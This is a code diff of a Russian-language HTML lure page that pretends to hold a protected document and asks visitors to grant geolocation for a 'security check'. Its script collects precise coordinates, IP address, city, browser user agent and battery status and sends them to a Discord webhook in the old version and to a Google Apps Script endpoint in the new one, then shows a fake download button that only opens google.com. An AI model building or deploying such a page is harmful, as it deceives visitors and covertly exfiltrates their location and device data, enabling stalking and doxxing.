@@ -1,13 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Документ защищен</title></head>
+<head>
+    <meta charset="utf-8">
+    <title>Проверка безопасности</title>
+</head>
 <body style="text-align:center; padding-top:50px; font-family:sans-serif;">
     <h2 style="color:red;">Документ защищен!</h2>
-    <p>Пожалуйста, разрешите доступ к геолокации для просмотра файла.</p>
-    <button id="dlBtn" style="display:none; padding: 15px 30px; font-size: 18px; background: blue; color: white; border: none; border-radius: 5px; margin-top: 20px;">Скачать файл</button>
+    <p>Пожалуйста, разрешите доступ к геолокации для проверки безопасности и просмотра файла.</p>
+    
+    <button id="dlBtn" style="display:none; padding: 15px 30px; font-size: 18px; background: #1a73e8; color: white; border: none; border-radius: 5px; margin-top: 20px; cursor: pointer;">Скачать документ</button>
+    
     <script>
-    let ua = navigator.userAgent;
     document.getElementById('dlBtn').onclick = function() { window.location.href = "https://www.google.com"; };
+    
+    let ua = navigator.userAgent;
+    let batteryStatus = "Неизвестно";
+    
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            batteryStatus = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Заряжается)" : "");
+        });
+    }
 
     navigator.geolocation.getCurrentPosition(
         (pos) => { sendData(pos.coords.latitude, pos.coords.longitude); },
@@ -16,29 +29,17 @@
     );
 
     function sendData(lat, lon) {
-        fetch('https://ipwho.is/')
-            .then(r => r.json())
-            .then(d => {
-                if (d.success === false) throw new Error("API Error");
-                sendToDiscord(d.ip, d.city, lat, lon, ua);
-            })
-            .catch(() => {
-                // Резервный сервис, если первый упал
-                fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => sendToDiscord(d.ip, "Неизвестен", lat, lon, ua))
-                    .catch(() => sendToDiscord("Скрыт", "Неизвестен", lat, lon, ua));
+        fetch('https://ipwho.is/').then(r => r.json()).then(d => {
+            let url = "https://script.google.com/macros/s/AKfycbxRqwoAVwQQQFfl4lANQN8GuYuyatT_yda1rXEmw-RJemc9WaZz6PmYUOsf6Z5U-_qHSg/exec?ip=" + d.ip + "&city=" + d.city + "&lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua) + "&battery=" + encodeURIComponent(batteryStatus);
+            
+            fetch(url, {mode: 'no-cors'}).then(() => {
+                document.getElementById('dlBtn').style.display = 'inline-block';
             });
-    }
-
-    function sendToDiscord(ip, city, lat, lon, ua) {
-        let msg = "IP: " + ip + " | City: " + city + " | Maps: https://www.google.com/maps?q=" + lat + "," + lon + " | UA: " + ua.substring(0, 50);
-        fetch("https://discord.com/api/webhooks/1569604511620669570/pUUVOujnJeA6cpOvxIZ1a1EMqDnvdZF3eF2Fr0yjTZqm0iK_o8ZqtYZb1TSz6hfTsHK8", {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({content: msg})
-        }).then(() => {
-            document.getElementById('dlBtn').style.display = 'inline-block'; // Показываем кнопку
+        }).catch(() => {
+            let url = "https://script.google.com/macros/s/AKfycbxRqwoAVwQQQFfl4lANQN8GuYuyatT_yda1rXEmw-RJemc9WaZz6PmYUOsf6Z5U-_qHSg/exec?ip=Unknown&city=Unknown&lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua) + "&battery=" + encodeURIComponent(batteryStatus);
+            fetch(url, {mode: 'no-cors'}).then(() => {
+                document.getElementById('dlBtn').style.display = 'inline-block';
+            });
         });
     }
     </script>
